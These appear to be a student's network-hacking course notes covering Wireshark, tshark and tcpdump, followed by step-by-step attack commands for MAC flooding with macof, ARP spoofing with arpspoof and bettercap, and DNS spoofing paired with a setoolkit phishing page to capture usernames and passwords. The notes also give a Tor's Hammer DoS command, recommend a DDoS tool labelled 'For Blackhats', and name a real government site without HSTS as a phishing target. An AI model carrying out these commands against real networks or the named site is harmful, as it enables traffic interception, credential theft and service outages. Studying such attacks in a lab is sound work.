
### Topics 

- ● What is Network Hacking? 
- ● Network footprinting 
- ● Network sniffing 
- ● Network Captures 
- ● Mac attack 
- ● Arp poisoning 
- ● DNS Spoofing Attack 
- ● DOS and DDOS Attacks 
- ● General Prevention Techniques

# Network Hacking

- A branch of computer security related to Gathering and exploiting of networks.
- **NB**. Hackers are not magicians but superheroes.


#### This includes:

- Network info gathering.
- sniffing and 
- network attacks

- [ ] Different tools for **recon process**: 
- Ping
- Nmap
- TraceRoute
- Arp
- Netstat
- ss

## Ping

- Checks if host is up or down. works in ICMP protocol.
- Ping **Commands**:
	- count (`-c`)   - to terminate the ping request after some requests.
	EG.	`ping 88.8.8.8 -c 2`        # Terminates after requesting two requests
	- packet size (`-s`)  - by default packet size of linux is 64 byte and for windows
	EG.  `ping 8.8.8.8 -s 108     # They do not know the request is from linux or other.`
	- 32 byte. so we can change it.
- **Variants of Ping**:
	- **fping**: to ping multiple hosts like nmap.../24
	- **nping**: to change the sending protocol, timing tests and allowing more advanced packet crafting.
	- **hping**: a more advanced tool that allows sending custom TCP, UDP and ICMP packets.

## Traceroute
● **Traceroute** is a network diagnostic tool used to trace the path that packets take from a source to a destination across a network.
```
tracerout google.com
```
this shows all routes path up to the server.

- ● It helps determine the route taken by packets and measures the time taken for each hop along the way.

- ● By Default uses ICMP requests to track. 
- Some Routes **Block ICMPs** or might be set to be invisible then we might see ( `* * * * `) so to fix that we can use Dynamic Traces Using **MTR**. 
- ○ **Syntax**:
```
	mtr google.com
```


## Netstat
- If something makes a connection with us this can show it.
- **netstat (short for Network Statistics)** is a command-line utility used to display network connections You made, routing tables, interface statistics, and multicast memberships.
- ● **Functions of netstat** 
	- ○ Display Active Connections 
	- ○ Show Listening Ports:      **`netstat -l`**
	- To check the **port creater SW**(APP):   **`netstat -p`**  eg. from Firefox, Chrome... may be malwares.. etc
	- ○ View Network Interface Statistics 
	- ○ Display Routing Tables
- Just click: **`netstat`**    
- The response is *Estabilished(connected), Time_wait(not using currently) or Closes_wait(conn closed)*.


## SS
- Faster and more detail than netstat.
- -t : tcp -u: udp -l: listening -p: process(Who create)
- **EG**:
```
  ss -t  ,  ss -u  ,  ss -p   or   ss -ltp

ss -ltp  ...shows open tcp listenning ports and who create them.

```
**NB**.  `ss -n`    ...only port(with number).    check other options(ss --help)
- eg:  `ss -tn`


# Network sniffing

**Sniffing**: is the process of monitoring and capturing all the packets passing through a given network.
- It is a form of “**tapping phone wires**” and get to know about the conversation.
## Types of sniffing
#### 1. Passive Sniffing
- Visible traffic but not altered. only monitor the traffic. mostly in **HUB**.
#### 2. Active Sniffing
- Actively contact and can alter and monitor. in some way as determined by the attack.
- Active sniffing is used to sniff a switch-based network.

# Sniffing networks...

● **To Sniff on Networks, There are many Tools We can use.** 
	- ○ Wireshark 
	- ○ Tcpdump 
	- ○ Tshark 
	- ○ Microsoft Message Analyzer 
	- ○ Network Miner 
- ● From these kinds Lets Learn Wireshark tool.

# WireShark
- ● It is One popular **passive monitoring tool**. 
- ● Wireshark technically is referred to as a “protocol analyzer”, but it uses only passive observation of network traffic. 
- ● Wireshark supports both live and offline analysis, 
- ● Has a graphical user interface, 
- ● It is for windows and linux. 
- ● Can be used for analyzing multiple protocols. 
- ● It can Capture and record network Traffics and Save it in Form of .cap/.pcap file
- **To Open** You can type it on terminal: `>  wireshark`
- You can add/open pcap/cap files too.

### some wireshark steps

You will see Interfaces and adaptors... eg. eth0, wlan, any..
- **any**: means frm any adaptor of interfaces..
- **loopback**: localhost...
- And also shows signals: if straight, it is not working currently.
- If there is some thing the signals will move.

- Open wireshark with root!:  `sudo wireshark`
- then you will get the captures:

- **In tool bar**: 

| Triangle like sign | square sign    | triangle like with arrow | ... | ... | ... |
| ------------------ | -------------- | ------------------------ | --- | --- | --- |
| start capture      | stop capturing | reload/restart           |     |     |     |
and also the other toolbar options are there like: save, close, enlarge text.. etc

- Then the **filter toobar**: Using different filters, to get dt packets you want like: **ICMP, HTTP, Data with packet length, source/destination IP from...**

- **packet list pane**: shows about packets(blue teeming):

| Time | src | dst | protocol | length | Info |
| ---- | --- | --- | -------- | ------ | ---- |
|      |     |     |          |        |      |
- **Packet detail pane**: If you click one packet from the abovepacket list pane, It displays its details.
- **Packet byte pane**: The byte(Hex) value of packet detail pane.

## Packet list pane
- We can see what out machine is Accessing/requested.
- (NO, Time, source IP, Destination IP, Protocol, Length, Info)
- We can edit Time: ->**view** -> select "**Time Display format**"
- **NB**: Start, and then Save with pcap/cap format.


# Understanding Networking With WireShark

The WireShark can Describe Data with the **OSI layer format on the Packet Detail Pane** And Also On Protocol Hierarchy , However, Wireshark primarily focuses on the lower layers (from Physical to Transport) and does not explicitly break down the Session and Presentation layers as distinct entities in its display.
- In **statistics** >> **protocol heirarchy** and **% for protocols** 

- In **packet detail pane**, you can expand each: It shows the protocols up to physical layer.      ...check this always practice it...


## Network conversation

Above the toolbar there is **'statistics'**, go to **'ststistics'** -> **'Conversations'**
- First accept the pcap file, then open it and then open the **conversation** from **statistics**. 
- so, you will see different IP addresses and dt connections.
- And by "capturing" and go to "conversations" you can see your cptr connections with another cptrs.


## Filtering

● On the search bar you can search protocols(ICMP,ARP,HTTP..) or some ip addresses as shown.  It also try to suggest you and complete it for you.

- ● You can use Different Comparison signs. 
	- ○ > , < , != , >= , <= , == 
		- ■ frame.len < 1090 
- ● You can Combine Filters with 
	- ○ && , || , ! 
	- ○ Ex: http && dns 
- ● You can Wrap some Comparisons 
	- ○ (A || B) && C 
	- ○ (A || B) && !C 
- ● You Can Learn Some Filters, But you don't need to learn all of them, On Wireshark You can Click on the thing you want and it will set a filter for you. After You type the protocol and add ‘.’(DOT) it will List some options for you. eg(`http.`)
#### Filter Commands EG:
```
ip.src==10.122.13.2 && ip.dst==163.62.64.1
ip.src eq 10.122.13.2 and ip.dst eq 163.62.64.1
ip.src==10.122.13.2 || ip.dst==163.62.64.1
http && (ip.src==10.122.13.2 && ip.dst==163.62.64.1)
!(ip.dst==12.17.199.1)
ssh
```
Additionally: ChatGPT has always an answer, That is another Awesome way to get the filters you want.


## Following Streams.

● We can **Follow the Packets Steps** and Can Understand What the request is, if not Encrypted.
- ● To Demonstrate this Lets Use A service called FTP.
- If you need the **cap/pcap file**:  https://github.com/markofu/pcaps/blob/master/PracticalPacketAnalysis/ppa-capture-files/ftp.pcap
- ● This Will Log All TCP,UDP,HTTP protocol data Sequentially and display for you. 
- ● This Will Help You to see what is happening on the network Clearly.
### Steps to follow packets:
- **NB**. To follow just **right click on the protocol** of the packet then "**Follow**"> then "**TCP stream".
- Then you can see what actions were Done with TCP.
- "**HTTP stream**" - you can get web datas.  NB. here you will follow the stream by increasing/decreasing **stream size** (at right bottom).
- "**TCP stream**" - request of someone. 

## Exporting Data

- If someone downloads any filetype /may be malware/, you can download it.
- Run pcap file, go to "file" -> "Export objects" then select object options like: HTTP, SMP, TFTP ...etc.  by clicking one you can save the file.
- **Example**: if we have some http sites accessed on the network we can export that network traffic that means we will have the html code.

### Another way of Exporting Data

Filter and click one packet, then go down to the "**packet detail pane**", then "**right click**" on one Info that you want, then click the option "**Export packet byte**" then save it -> like(`xx.html`).

#### How to save the pcap?
- paus the capture
- then go to 'file' then "save as" with(.pcap or .pcapng)

#### Get mac, ip...(all OSI)
- click packet -> go to packet detail pane -> to get mac choose "ethernet" expand it... 
- **source and dst ports** eg. 40->60   ...at the **info** part.
- to look **ipv4 and ipv6 conversations**: go to "statistics" -> "conversations"
- To know **number of protocols sent** like TCP, udp, Telnet... go to "statistics" -> "protocol heirarchy".
- **NB**. **Telnet**: is used to run commands like: **ssh**
# Tshark

Install with wireshark.
- **Tshark**: is a command line tool, which can do anything that Wireshark does.
- uses small GPU, RAM...
- you  can insert the file/parts to **awk, sed**...
	- it can capture network traffics. 
	- Filter 
	- Read Pcaps 
	- Save Captures
- **Syntax**: 
- ○ **Capture**: 
```
          tshark -i <interface>
          
      eg. tshark -i eth0
	      tshark -i wlano
```

## Filtering Traffic ( -Y )

As you can see it is in column format so we can use some linux based tools to filter how many IPs we have.
- **filtering eg**: 
```
   tshark -i wlano -Y "ip.src == 192.168.1.10"
   tshark -i wlano -Y "dns"
   tshark -i wlano -Y "ip.addr == 192.168.1.10 and dns"
```

## Reading Pcaps ( -r )

**syntax**:
```
	  tshark -i <interface> -r [path of file]
eg.   tshark -i wlano -r ~/Downloads/hackers.pcapng
```

### Advanced techniques:

```
tshark -i wlano 2> /dev/null         ...error free
tshark -i wlano  -w file.cap         ...save the file
tshark -r file.cap     .......then read the file
```

## Fixing the time (-t ad):
```
tshark -i wlano -t ad
```

## limit the capture (-c):
```
tshark -r ~/sol/xy.pcap -c 10
```

## Stream follow:
syntax: `tshark -r <file.cap> -q -z follow,tcp,ascii,{stream num}`
```
tshark -i -r ~/Downloads/hackers.pcapng -q -z follow,tcp,ascii,2

try reading by changing the stream number.
```

## Stream number with for loop:
```
for i in {1..100}; do tshark -r hackers.pcapng -q -z follow,tcp,ascii,$i; done
```

- We can grep, awk, sed:  
```
  tshark -r xxy.cap | grep 'data'

  tshark -r xxy.cap | awk "{print $3}"     prints ip only
```


# TCPdump

**tcpdump** is a powerful command-line packet analyzer tool that captures and displays network packets transmitted and received over a network interface.
- **Syntax**: `sudo tcpdump -i  <interface>`
- You can **Save** the Capture:
```
>	ip a
>	sudo tcpdump -i eth0 -w capture.pcap
```
- You can **Capture** Specific Protocol/Port:
```
>	sudo tcpdump -i eth0 port 443
>	sudo tcpdump -i eth0 icmp
```

## What is ARP /Address Resolution Protocol/

- Address Resolution Protocol (**ARP**) is a procedure for mapping a **dynamic IP address** to a **permanent physical machine address** in a local area network (LAN). The **physical machine address** is also known as a media access control (**MAC**) address.
- The reason why we need ARP is because computers need to know both the IP address and the MAC address of a destination before they can start network communication.
- Look at in **wireshark** capture: in protocol part you will see ARP and in info part you will see **`"Who has <IP>"...and..."<ip> is at <mac>"`**

## Arp Command

- A Command Line tool that will Display the **Mac Table Cached on our Computer**.
- use command: `arp`
- When Your Computer Sends ARP Requests:
	- **Initial Communication**: When your computer needs to send data to another device on the same network, it checks its ARP cache to see if it already knows the MAC address associated with the destination IP address. 
	- **ARP Request**: If the MAC address is not in the ARP cache, the computer broadcasts an ARP request packet on the network. This request asks, "Who has IP address X? Tell me your MAC address." 
	- **ARP Reply**: The device with the matching IP address responds with its MAC address. 
	- **Caching**: After receiving the ARP reply, the computer stores the IP-to-MAC address mapping in its ARP cache for future use.
```
~>$	arp
   Address         HWtype  HWaddress          Flags Mask  Iface
   172.20.101.200  ether   30:dc:44:a7:43:cf  C           wlan0
   172.20.101.200  ether   a2:cd:ff:cb:73:dc  C           wlan0
   172.20.101.200  ether   30:dc:44:a7:43:cf  C           br-163a8ba604c
```

## Mac flooding

- **MAC Flooding**: is one of the most common network attacks.
- Unlike other Network attacks, MAC Flooding is not a method of attacking any host machine in the network, but it is the method of attacking the network switches.
- However, the victim of the attack is a host computer in the network.
- the switches maintain a table structure called **MAC Table**.
- This MAC Table **consists of individual MAC addresses** of the host computers on the network which are **connected to ports of the switch**.
- This table **allows the switches to direct the data out of the ports** where the recipient is located.
	- As we’ve already seen, the **hubs broadcast the data to the entire network allowing the data to reach all hosts on the network** but **switches send the data to the specific machine(s)** which the data is intended to be sent.
	- This goal is achieved by the use of MAC tables.
- The aim of the MAC Flooding is to takedown this MAC Table. 
- In a typical MAC Flooding attack, the **attacker sends Ethernet Frames in a huge number**. When sending many Ethernet Frames to the switch, **these frames will have various sender addresses**. The intention of the attacker is consuming the memory of the switch that is used to store the MAC address table. 
- The **MAC addresses of legitimate users will be pushed out of the MAC Table**. 
- Now the switch cannot deliver the incoming data to the destination system. So considerable number of **incoming frames will be flooded** at all ports.

## Mac table
- You can look the table in switch: `show mac address-table`

## The Attack

### demo:
- I have set ping sweep on my windows to check the connection 
- Wireshark to see the package 
- And used macof tool for the mac f lood. 
- Also can be sent to specific 1 destination /ip 
- The command needs 
	- `sudo`
- On **windows**:
```
ps C:/Users/Nathan Hailu>   ping google.com -n 10000
```
- On **linux**:
```
>	sudo macof -i wlan0                      #general attack of router
>	macof -i wlan0 -n 10 -d 192.168.220.140    #with specific destination
```
**Macof** will send a lot of fake MAC’s to the switch and makes if confused, and do stop proper functioning this can cause **disconnections between hosts**.
- As you see google is now disconnected from host.

## Wireshark mac spoof
- You can see the process and the result on wireshark.
- This can cause huge damage on the network, it is fixed by rebooting the router. DONT try it on your network

## Prevention

1. **Port Security** – Limits the no of MAC addresses connecting to a single port on the Switch. `switch port-security maximum 5`
2. **MAC Filtering** – Limits the no of MAC addresses to a certain extent.

## ARP Spoof

- **ARP** translates Internet Protocol (IP) addresses to a Media Access Control (MAC) address.
- Most commonly, devices use ARP to contact the router or gateway that enables them to connect to the Internet.
- An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between network devices. The attack works as follows:
	1. The attacker must have access to the network. They scan the network to determine the IP addresses of at least two devices —let’s say these are a workstation and a router.
	2. The attacker uses a spoofing tool, to send out fake ARP responses.
	3. The fake responses advertise that the correct MAC address for both IP addresses, belonging to the router and workstation, is the attacker’s MAC address. This fools both router and workstation to connect to the attacker’s machine, instead of to each other.
	4. The two devices update their ARP cache entries and from that point onwards, communicate with the attacker instead of directly with each other.
	5. The attacker is now secretly in the middle of all communications.

## ARP Cache poisoning / Arp Spoofing

## demo
1) We will get the mac of our gateway 2)
2) We will get our linux machine mac 
	- a) arp -g 
3) Enable ip forward 
	- a) sudo sysctl net.ipv4.ip_forward=1 
4) Disable Firewall 
	- a) sudo ufw disable 
5) Start the spoofing with arpspoof tool 
	- a) Arpspoof -i interface -t target -r defaultgatewayip 
- **NOTE**: 
	- ip of attacker: 192.168.1.8 
	- Ip of victim: 192.168.1.3 
	- gateway : 192.168.1.1
- On **windows** you can get **victim ip** and **gateway**:
```c
ps D:\Users>  arp -g

Interface: 192.168.1.3 --- 0x24
  Internet Address    Physical Address     Type
  192.168.1.1         30:dc:44:a7:43:cf    dynamic
  192.168.1.255       a2:cd:ff:cb:73:dc    static
  224.0.0.2           30:dc:44:a7:43:cf    static
  ...                 ...                  ...
```
- Check the mak also!!
- In **linux**:
```
~>$	  sudo systemctl net.ipv4.ip_forward=1       #allow forwarding
~>$	  sudo ufw disable                       #stop firewall
~>$	  sudo arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1
```
After i started the arpspoof now the mac of the gateway is same with the attacker/kali machine.
- look in wireshark.

## Demo in advance

1) Install bettercap 
2) Start bettecap 
3) Scan the network 
	- a) `net.probe on `
	- b) `net.show` => to see the network 
4) Start arp spoofing 
	- a) `set arp.spoof.targets <ip>` 
	- b) `set arp.spoof.fullduplex true` 
	- c) `arp.spoof on` 
5) Enable Forwarding and Disable Firewall 
	- a) `sudo sysctl net.ipv4.ip_forward=1`
	- b) `sudo ufw disable`
6) Start Mitm 
	- a) `net.sniff on`
	- b) `net.sniff off`
- The `net.show` will display every information we got about the hosts joined in the network. 
- For this Demo, We are going to Attack a windows Computer. 
	- **Attacker**(kali): 192.168.1.8 
	- **Victim**(win): 192.168.1.9 
	- **Gateway**: 192.168.1.1
```bash
~>$   sudo apt install bettercap
~>$   sudo bettercap -iface wlan0     # gives new bettercap terminal
192.168.1.0/24 > 192.168.1.8 >>   net.probe on       # Scan the network
192.168.1.0/24 > 192.168.1.8 >>   net.show         # to see the network in table form
# We start By Setting Our Arp Spoof target and Making Full Duplex True.
192.168.1.0/24 > 192.168.1.8 >>   set arp.spoof.targets 192.168.1.1, 192.168.1.9
192.168.1.0/24 > 192.168.1.8 >>   set arp.spoof.fullduplex true
# Now, Lets Enable Our Arp Spoof
192.168.1.0/24 > 192.168.1.8 >>   arp.spoof on
```

- Now, Lets Check the Arp Cache on windows.
```c
ps c:\Users>   arp -a
```
- Let’s Start Our Sniffer, Bc Now we are between The Gateway and Victim PC. 
	- But We need to disable firewall and enable routing on our machine
```bash
~>$   sudo systemctl net.ipv4.ip_forward=1
~>$   sudo ufw disable
```
- Start the sniff process:
```bash
192.168.1.0/24 > 192.168.1.8 >>   net.sniff on
```

## HTTP vs HTTPs

- **HTTPS** is essential for securing web communications, protecting users' sensitive data, and ensuring a trusted browsing experience, while HTTP is considered outdated and insecure.
- So, We Can Sniff HTTP requests As you can Observe.

## Prevention

1. **Using static ARP tables**: manually setted 
2. **Switch security**: some feature for ARP poisoning 
3. **Encryption**: not for arp but in case of leaks

## DNS Spoofing

DNS, or the domain name system, is the phonebook of the Internet, connecting web browsers with websites.
```
www.google.com      172.217.2.36
www.evernote.com    204.154.94.81
www.sfsymphony.org  66.40.15.115
www.atlessian.net   104.192.136.171
```
- Domain Name Server (DNS) spoofing, or DNS cache poisoning, is an attack involving manipulating DNS records to redirect users toward a fraudulent, malicious website that may resemble the user’s intended destination.

## How Does DNS Spoofing Work?

DNS spoofing works by exploiting flaws in the DNS and its associated protocols. An attack can be accomplished in several ways:
- a. A malicious actor may use address resolution protocol (ARP) to access router traffic and alter the domain name resolution records. 
- b. The attacker can modify an authoritative DNS server’s records, redirecting traffic to the fraudulent website. 
- c. The attacker can target an intermediate name server and exploit weaknesses in its caching system to perform a Man-in-the-Middle (MITM) attack.

## How to Perform DNS Spoof

- We will Prepare our Site to Spoof on our Local Host. 
	- This can be Our Phishing page.(`setoolkit`)
- We Have To Do Arp-Poisoning 1st. 
- We will Perform the DNS Spoof with Bettercap. 
	- We will Set Domain to Spoof
```bash
192.168.1.0/24 > 192.168.1.8 >>   set dns.spoof.domains googl.et
```
- We Will Start the Poisoning:
```bash
192.168.1.0/24 > 192.168.1.8 >>   dns.spoof on
```
Now, we Just send the domain(`googl.et`) we specified to the Victim.
## We Got Hit.
- When We check our BetterCap and Setoolkit Result.
- We have got Hit.
- Now we can look the username, password... etc from our phishing site.

## DNS Obtaining

- Hosts, Sometimes get DNS Server Address Directly From the Router when they Get Assigned IP with DHCP or They Might Get Static DNS. 
- Now, It is Hard to assign A Already Used Domain for our Poisoning.
```
192.168.1.0/24 > 192.168.1.8 >>   set dns.spoof.domains google.com, *.google.com
192.168.1.0/24 > 192.168.1.8 >>   dns.spoof on
```
But Most Of the Time If the Sites does not Have HSTS We can Try to Poison with their original domain.

## HTTP Strict Transport Security / HSTS

- HTTP Strict Transport Security (**HSTS**) is a web security policy mechanism that helps **protect websites against attacks such as protocol downgrade attacks and cookie hijacking**. 
- HSTS forces browsers to interact with websites only over HTTPS, ensuring that all communication is encrypted. 
- This Policy Can Make Us Stop Poisoning the DNS on that Domain.

## Protocol Downgrade Attack

- It is An Attack that can be Performed by Downgrading The HTTPS to HTTP.
- This will enable us to Sniff the traffic, with unencrypted way. 
- Let’s Perform Just, The Spoof.
- https://statsetihipia.gov.et this site has no HSTS on CMS.
- so we can use  http://statsetihipia.gov.et for our phishing page.

## DOS and DDOS Attacks

- **DoS** is short for **Denial-of-Service** attacks.
- **DDoS** stands for **Distributed Denial-of-Service** attack.
- It's used to crash a website by overwhelming the network with access requests from a computer. This method also crashes a targeted website and makes it unavailable to legitimate users.(like Mac spoofing).
- It is purposeful attack
- On DDOS, the request will be sent from DIfferent Computers/hosts this will make the attack harder.
- It is Highly illegal!
- **Techniques**
	- SYN floods 
		- Sending lots of SYN 
	- Service Request floods 
		- Create many connections 
	- Application level DOS 
		- Exploiting vulns like 
			- Buffer Overflow 
			- SQL injection

## Tools For DOS

1. SolarWinds Security Event Manager (SEM) 
2. ManageEngine Log360 
3. HULK 
4. Tor’s Hammer 
5. Slowloris 
6. LOIC 
7. Xoic 
8. DDOSIM 
9. RUDY 
10. PyLoris

## Tor's Hammer
```bash
~>$   # download torshammer from github
~>$   sudo python torshammer.py
~>$   ./torshammer.py -t <ip> -r <number of request>
~>$   # Using this you can make a dos attack

```
## MegaMedusa (For Blackhats)

- **MegaMedusa** is NodeJS DDoS Machine Layer-7 provided by RipperSec Team.
- More recommended.
- LINK: https://github.com/TrashDono/MegaMedusa 

## Prevention ways

- Have you seen Cloudflare, These pages are One of the prevention ways. 
- Limit or shut off broadcast forwarding where possible 
- Set up firewalls 
- Eliminate and patch known vulnerabilities 
- Monitor network inbound traffic

# General Prevention Techniques

-  Preventing network attacks is crucial for maintaining the security and integrity of computer networks. 
- Here are some key measures and best practices to help prevent cyber attacks:
	- a. Deploy a Robust Firewall
	- b. Deploy Intrusion Detection and Prevention Systems (IDS/IPS)
	- c. Implement Strong Data Encryption
	- d. Implement Strong Access Controls
	- e. Conduct Regular Vulnerability Assessments and Penetration Testing
	- f. Implement Comprehensive Network Monitoring
	- g. Regular Updates and Patching


